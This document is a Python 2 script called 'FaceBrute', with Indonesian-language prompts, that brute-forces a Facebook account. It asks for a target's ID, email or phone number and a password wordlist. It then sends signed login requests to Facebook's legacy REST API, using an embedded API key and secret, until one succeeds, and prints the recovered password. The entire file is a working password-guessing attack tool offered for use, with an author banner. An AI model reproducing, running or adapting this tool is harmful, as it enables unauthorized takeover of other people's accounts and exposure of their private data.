## Facebook Brute Force
# -*- coding: utf-8 -*-
import os
import sys
import urllib
import hashlib

API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"

__banner__ = """
::::::::::     :::      ::::::::  :::::::::: :::::::::  :::::::::  :::    ::: ::::::::::: ::::::::::
:+:          :+: :+:   :+:    :+: :+:        :+:    :+: :+:    :+: :+:    :+:     :+:     :+:
+:+         +:+   +:+  +:+        +:+        +:+    +:+ +:+    +:+ +:+    +:+     +:+     +:+
:#::+::#   +#++:++#++: +#+        +#++:++#   +#++:++#+  +#++:++#:  +#+    +:+     +#+     +#++:++#
+#+        +#+     +#+ +#+        +#+        +#+    +#+ +#+    +#+ +#+    +#+     +#+     +#+
#+#        #+#     #+# #+#    #+# #+#        #+#    #+# #+#    #+# #+#    #+#     #+#     #+#
###        ###     ###  ########  ########## #########  ###    ###  ########      ###     ########## v1.0


╔═════════════════════════════════════════════════╗
║Tools     : ₣aceBruteV1.0               
║Author    : NotGuardian
║Github    : https://github.com/NotHax
║Instagram : https://instagram.com/notguardianyt
║We From ChipWy ( Chicken Playing With You )
║Jika Ada Bug Tinggal DM Author Aja Ya
╚═════════════════════════════════════════════════╝
"""
print(__banner__)
print(" [+] Welcome To FaceBrute\n")
print(" [+] Facebook Brute\n")
userid = raw_input(" [*] Masukan ID/Gmail/Nomor Target: ")
try:
	passlist = raw_input(" [*] Masukan WorldList (Contoh :worldlist.txt): ")
	if os.path.exists(passlist) != False:
		print(" [+] Meng Crack Akun  {}".format(userid))
		print(" [+] Jumlah Password {}".format(len(open(passlist,"r").read().split("\n"))))
		print(" [+] Mohon Tunggu....")
		for passwd in open(passlist,'r').readlines():
			sys.stdout.write(u"\u001b[1000D [*] Mencoba {}".format(passwd.strip()))
			sys.stdout.flush()
			sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}".format(userid,passwd.strip(),API_SECRET)
			xx = hashlib.md5(sig).hexdigest()
			data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}".format(userid,passwd.strip(),xx)
			response = urllib.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read()
			if "error" in response:
				pass
			else:
				print("\n\n [+] Berhasil Meng Crack")
				print("\n [+] Password : {}".format(passwd.strip()))
				break
		print("\n\n [!] Selesai")
	else:
		print("facebrute: error: No such file or directory")
except KeyboardInterrupt:
	print("facebrute: error: Keyboard interrupt")
